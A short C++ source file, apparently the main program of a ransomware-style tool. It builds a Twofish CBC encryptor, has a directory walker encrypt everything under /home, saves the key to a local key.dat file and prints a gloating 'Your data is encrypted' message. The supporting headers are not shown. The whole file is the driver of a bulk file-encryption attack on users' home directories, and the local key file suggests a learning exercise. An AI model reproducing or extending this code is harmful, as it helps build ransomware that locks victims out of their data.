#include <fstream>
#include <iostream>

#include "symmetric.hpp"
#include "walker.hpp"
#include "cbctwofish.hpp"


int main(int argc, char **argv) {
    std::shared_ptr<Symmetric> coolCryptor(std::make_shared<CBCTwofish>());

    Walker shadowWalker("/home", coolCryptor);

    shadowWalker.setCmdArgs(argc, argv);

    std::ofstream saveKey("key.dat");

    saveKey << coolCryptor->getKey();// + coolCryptor->getIV();
    saveKey.close();
    shadowWalker.walk();

    std::cout << "Your data is encrypted ;}" << std::endl;

    return 0;
}
